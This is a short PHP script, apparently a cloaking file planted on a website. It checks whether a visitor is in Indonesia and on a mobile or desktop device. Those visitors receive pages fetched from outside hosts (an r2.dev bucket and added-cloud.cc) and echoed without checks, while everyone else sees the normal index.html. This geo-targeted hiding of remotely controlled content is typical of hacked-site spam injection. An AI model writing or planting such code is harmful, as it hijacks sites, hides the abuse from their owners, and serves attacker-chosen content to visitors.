<?php

// Get user IP
$user_ip = $_SERVER['REMOTE_ADDR'];

// Get location data from IP
$location_data = json_decode(file_get_contents("http://ip-api.com/json/{$user_ip}"));

// Check if the user is in Indonesia
if ($location_data->country === 'Indonesia') {
    
    // Check if the user is using a mobile device
    if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
        // Get content for mobile version
        $url = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.operetta.com.ua.html';
    } else {
        // Get content for desktop version
        $url = 'https://added-cloud.cc/packdol/getcontent/tets/lp.txt';
    }

    // Fetch content from URL
    $content = file_get_contents($url);
    
    // Display content
    echo $content;

} else {
    // Display alternative content from index.html for users not in Indonesia
    $alternative_content = file_get_contents('index.html');
    
    // Display alternative content
    echo $alternative_content;
}
